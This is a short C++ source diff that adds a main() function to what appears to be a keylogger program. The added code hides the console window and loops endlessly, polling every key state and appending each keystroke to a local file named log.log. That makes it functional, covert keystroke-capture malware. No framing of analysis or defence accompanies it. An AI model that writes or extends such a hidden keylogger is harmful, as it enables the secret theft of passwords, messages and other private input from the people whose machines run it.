@@ -17,8 +17,6 @@ void LOG(string input) {
 }
 
 bool SpecialKeys(int S_Key) {
-	//LOG(S_Key);
-	
     switch (S_Key) {
         case VK_SPACE:
             cout << " ";
@@ -52,4 +50,25 @@ bool SpecialKeys(int S_Key) {
             return false;
     }
     
+}
+
+int main() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    while (true) {
+    	POINT p;
+        for (int KEY = 0; KEY <= 255; KEY++) {
+            if (GetAsyncKeyState(KEY) == -32767) {
+                if (SpecialKeys(KEY) == false) {    	
+                    fstream LogFile;
+                    LogFile.open("log.log", fstream::app);
+                    if (LogFile.is_open()) {
+                        LogFile << char(KEY);
+                        LogFile.close();
+                    }
+                    
+                }
+            }
+        }
+    }
+    return 0;
 }
